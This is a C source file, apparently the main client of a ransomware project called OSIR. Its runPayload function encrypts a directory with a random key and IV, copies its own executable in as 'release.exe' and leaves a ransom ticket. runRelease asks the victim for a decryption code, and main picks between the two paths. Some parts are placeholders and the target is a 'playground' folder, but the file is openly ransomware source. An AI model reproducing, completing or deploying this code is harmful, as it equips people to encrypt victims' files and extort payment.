/*
	Main source file for OSIR client
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "common/clonelib.h"
#include "common/ransomlib.h"
#include "common/common.h"
#include "common/os.h"
#include "common/thirdparty/b64.h"

void locateExternalDrive(char **path)
{
	*path = (char *) malloc(sizeof(char) * strlen("placeholder"));
	strcpy(*path, "placeholder");
}

//Ransomware payload
bool runPayload(const char *directory, const char *arg0)
{
	char *keyiv;

	//Generate key+iv
	if (!secureRand(&keyiv, SYMMETRIC_KEY_SIZE + SYMMETRIC_IV_SIZE)) {
		fprintf(stderr,
			"Error: runPayLoad: failed to generate keyiv");
		return 0;
	}
	//Encrypt Directory
	if (!encryptDirectory(keyiv, directory)) {
		fprintf(stderr, "runPayload: encryptDirectory failed\n");
		free(keyiv);
		return 0;
	}
	//Get OSIR's Bytes
	char *bytes;
	int64_t bytes_size = getOwnBytes(&bytes, arg0);

	//Get release program path
	char *r_path =
	    (char *) malloc(strlen(directory) + strlen("/release.exe"));
	strcpy(r_path, directory);
	strcat(r_path, "/release.exe");

	//Write release program
	FILE *fp = fopen(r_path, "wb");
	if (fp == NULL) {
		fprintf(stderr,
			"Error: runPayload: Couldn't open file for cloning(%s)\n",
			r_path);
		free(r_path);
		free(keyiv);
		return 0;
	}
	fwrite(bytes, bytes_size, 1, fp);
	fclose(fp);


	//Write ticket
	makeTicket(keyiv, directory);

	//Free pointers
	free(bytes);
	free(r_path);
	free(keyiv);
	return 1;
}


bool runRelease()
{
	system(RELEASE_INTRO_SCRIPT);
	printf("To decrypt your files, please visit\n%s\n"
	       "and paste the release code.\n\n", "x");

	bool success = 0;

	//Prompt for code
	char code[64];
	while (!success) {
		printf(">>>");
		scanf("%s", code);

		//Check if code is proper length
		if (strlen(code) ==
		    (SYMMETRIC_KEY_SIZE + SYMMETRIC_IV_SIZE) * 2) {
			//Decode
			char *keyiv = b16decode(code);

			//Release
			success = decryptDirectory(keyiv, ".");
			if (!success)
				printf("Wrong code\n");
		} else {
			printf("Invalid Code\n");
		}

	}
	return success;
}


int main(int argc, char **argv)
{
	argc = argc;
	bool run_release = false;

	//Check if ticket exists in current directory
	if (fopen(TICKET_FILENAME, "r") != NULL) {

		//Check if ransom shit actually exists
		char **ls = walkDir(".");
		for (int i = 0; strcmp(ls[i], "\0"); i++) {

			//Check for ransom file endings
			if (strcmp(strrchr(ls[i], '.'), RANSOM_EXTENSION)) {
				run_release = true;
				break;
			}
		}
	}

	if (run_release) {
		runRelease();
	} else {
		/*Inf here */

		//Payload
		if (fopen("playground/" TICKET_FILENAME, "r") == NULL) {
			printf("runPayload: %s\n",
			       runPayload("playground",
					  argv[0]) ? "OK" : "Failed");
		} else {
			printf
			    ("Ticket already exists in that directory\n");
		}

	}

	return 0;
}
